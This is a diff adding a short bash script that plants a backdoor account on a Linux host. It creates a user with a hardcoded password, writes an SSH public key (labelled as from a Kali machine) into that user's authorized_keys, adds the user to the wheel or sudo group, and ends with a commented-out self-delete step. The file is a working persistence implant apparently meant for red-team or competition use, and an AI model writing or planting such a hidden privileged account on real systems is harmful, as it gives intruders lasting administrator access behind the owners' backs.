@@ -1,0 +1,27 @@
+#!/bin/bash
+
+#Variables for Making a new user
+username="Gekkomon"
+password="B@dguyo7"
+pubkey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC79Vdygw47naM62ewA0vEyj4bBmtfM1JUz5SGs42u9tS+IWBnoqUXB9XzCnSIBES79RGLHpamjynox0AFQI1ejZnN5sxVcdL9lbOTG1AqcrAn3ZdWT/dN7EdJ83e0ayhRv3HBdwqknfLRc2+uE+ERQGQv6taWjTz5glOnHSn/8dy0Rk7NS/JYIxLTBXyeXYTPQ3wdVeXbUOZb1JP9hrK89f5JQMDAow9SHUQY+PzSfUF7hrgp6YEZYns1yB+eTaTZlu/tzz883c6tRgtK475UlQBqKsyeFIPhugrXuJs36WQ60ZCCXwrfO8B3UwQREnyfOQlAqCGlpF7uOb5Mu5NWY+gaBHdYmq4Vir8RGVyeSum/5nZ+rG7fM7495JE6zsSdylRIQdP1MMpEnawr1INu3Twmd6VVsTrHmlMUf8M7o1q0JygOQTknUAMOUyOa8CfO9uk4r1wLxQqjneWUz/m6hIADkECkPF7CYFt9xNCavqTi5KndhADFkMYS5FusBPqXyj6Lq/+vosyX3SVLOiirv/vU+e/mVhNKXmkejS2tr/Ztg0Jvsz7Pvxe3aG9US05S//mZD/rfIqVyBMXnp0goHNO0YmhfWiReAVuCsaOLp8d3n1Lg8/t/9B48GyQs+N9jgeMWvw60mez7s9CladJqZLjQGwFKV80nrv9y4n5SViw== kaliadmin@kali2024baselinehpx"
+
+#Create User
+useradd -m -s /bin/bash "$username"
+echo "$username:$password" | chpasswd
+
+#Setup SSH Access with Key
+mkdir -p /home/$username/.ssh
+echo "$pubkey" > /home/$username/.ssh/authorized_keys
+chmod 700 /home/$username/.ssh
+chmod 600 /home/$username/.ssh/authorized_keys
+chown -R $username:$username /home/$username/.ssh
+
+#Add to sudo group
+#If Rocky, CentOS, or Manjaro
+usermod -aG wheel "$username"
+#If Devian based (Kali, Ubuntu)
+#usermod -aG sudo "$username"
+
+#Self Delete
+echo "Odemashi!"
+#rm -- "$0"
